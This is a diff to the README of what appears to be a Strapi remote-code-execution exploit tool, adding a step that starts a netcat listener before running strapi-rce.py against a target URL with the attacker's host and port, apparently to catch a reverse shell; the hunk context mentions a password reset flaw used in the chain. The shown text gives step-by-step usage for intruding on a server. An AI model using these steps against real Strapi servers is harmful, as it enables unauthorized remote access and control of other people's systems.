@@ -17,11 +17,17 @@ The exploit works by first leveraging a password reset vulnerability to obtain a
    git clone https://github.com/Hackhoven/Strapi-RCE.git
    ```
 2. **Navigate to the directory**
-
+   
    ```sh
    cd Strapi-RCE/
    ```
-3. **Run the script with the target URL, local host ip address, and local host port as arguments**
+3. **Set up a Netcat Listener**
+   
+   ```sh
+   nc -nlvp <LPORT>
+   ```
+4. **Run the script with the target URL, local host ip address, and local host port as arguments**
+   
    ```sh
    python3 strapi-rce.py <TARGET_URL> <LHOST> <LPORT>
    ```
